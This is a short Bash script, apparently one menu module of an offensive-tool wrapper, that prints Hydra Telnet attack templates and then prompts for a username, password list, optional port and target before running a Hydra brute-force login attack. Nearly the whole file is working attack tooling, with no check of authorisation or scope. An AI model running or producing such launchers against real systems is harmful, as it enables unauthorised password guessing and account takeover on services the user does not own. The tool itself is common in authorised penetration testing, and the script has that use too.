#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
Telnet Query
Telnet Command

1. Basic Telnet attack
hydra -l [username] -P [passwordlist] telnet://[target]
2. Telnet attack with port
hydra -l [username] -P [passwordlist] -s [port] telnet://[target]
EOF

read -r -p $'\nSelect-Options>Hydra>Telnet>' select

case "$select" in
  1)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" "telnet://$target"
    ;;
  2)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input port> " port
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" -s "$port" "telnet://$target"
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac

